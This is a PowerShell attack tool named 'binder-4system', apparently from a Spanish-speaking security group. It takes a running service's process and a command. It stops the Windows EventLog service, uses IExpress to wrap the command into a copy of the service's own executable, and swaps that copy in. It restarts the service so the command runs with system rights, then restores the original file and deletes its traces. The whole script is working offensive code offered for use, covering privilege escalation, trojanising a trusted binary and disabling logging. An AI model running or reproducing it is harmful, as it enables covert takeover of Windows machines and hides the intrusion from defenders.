function binder-4system {
param ([string]$procID,[string]$command_execute)

$process_target =  Get-Process -id $procid
$nombre_objetivo =  $process
$nombre_objetivo = $process_target.Name
$process_name = $process_target.Name
$path_process =  ($process_target | Select-Object -Property *).path
$pid_target = $process_target.Id
$service_name = (Get-WmiObject Win32_Service -Filter "ProcessId='$($procID)'").name

if ($nombre_objetivo,$process_target,$path_process,$pid_target,$service_name -eq $null ) {write-host "Script Error."; break} else {
write-host 
' _     _           _           _  _                 _                 
| |__ (_)_ __   __| | ___ _ __| || |  ___ _   _ ___| |_ ___ _ __ ___  
| `_ \| | `_ \ / _` |/ _ \ `__| || |_/ __| | | / __| __/ _ \ `_ ` _ \ 
| |_) | | | | | (_| |  __/ |  |__   _\__ \ |_| \__ \ ||  __/ | | | | |
|_.__/|_|_| |_|\__,_|\___|_|     |_| |___/\__, |___/\__\___|_| |_| |_|
                                          |___/                       
                                                     cybervaca @ hackplayers
'}

Stop-Service -Name EventLog  -Force ; sleep -Seconds 1
Stop-Service -Name $service_name -Force ; sleep -Seconds 1


$SED = '[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
UseLongFileName=0
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
TargetName=nombre_final
FriendlyName=Titulo
AppLaunched=objetivo
PostInstallCmd=ejecuta_comando
AdminQuietInstCmd=
UserQuietInstCmd=
FILE0=solo_nombre_archivo
[SourceFiles]
SourceFiles0=ruta_archivo
[SourceFiles0]
%FILE0%='
########################################################## 


$ErrorActionPreference = "SilentlyContinue"


########################################################## Parametros principales ########################################################## 

$solo_nombre_archivo = $nombre_objetivo
$nombre_final = "$nombre_objetivo-new.exe" ; $nombre_objetivo = "$nombre_objetivo.exe"
$ruta = ($path_process -replace $nombre_objetivo)
$archivo_sed = "$solo_nombre_archivo.sed"


################################################# Remplazamos plantilla con nuestras variables ##############################################
Set-Location $ruta
$sed = $sed -replace "objetivo", "$nombre_objetivo"
$sed = $sed -replace "nombre_final", "$ruta$nombre_final"
$sed = $sed -replace "ruta_archivo", "$ruta"
$sed = $sed -replace "ejecuta_comando", "$command_execute"
$sed = $sed -replace "solo_nombre_archivo", "$nombre_objetivo"
if ([int]$archivo_sed.count -gt 1) {$archivo_sed = $archivo_sed[0] + "_" + $archivo_sed[1]}
$sed > $archivo_sed


########################################################## Empaquetamos el .exe ##########################################################

Start-Process Iexpress.exe -ArgumentList  "/N $archivo_sed /Q"  -WindowStyle Hidden

do {

[int]$iexpress_activo = (Get-Process -Name "iexpress").Count
    Sleep 2
   }while ([int]$iexpress_activo -ge 1)


$nombre_objetivo_bkp = "$solo_nombre_archivo-bkp.exe"
$get_process = Get-Process -Name $process_name ; foreach ($killprocess in $get_process) {

if (($killprocess | Select-Object -Property *).description -like "*CAB*"){ $killprocess | Stop-Process -Force}

}
Copy-Item $nombre_objetivo  $nombre_objetivo_bkp 
Copy-Item $nombre_final $nombre_objetivo 
Start-Service -Name $service_name 
Stop-Service -Name $service_name 
do {

[int]$proceso_actual_wait = (Get-Process -Name "$nombre_objetivo").Count
    Sleep 2
   }while ([int]$proceso_actual_wait -ge 1)
$get_process = Get-Process -Name $process_name ; foreach ($killprocess in $get_process) {

if (($killprocess | Select-Object -Property *).description -like "*CAB*"){ $killprocess | Stop-Process -Force}

}

Copy-Item $nombre_objetivo_bkp $nombre_objetivo 
Remove-Item $archivo_sed
Remove-Item $nombre_final
Remove-Item $nombre_objetivo_bkp 
Start-Service -Name $service_name
start-Service -Name EventLog 
write-host "Script executed succefully"

}



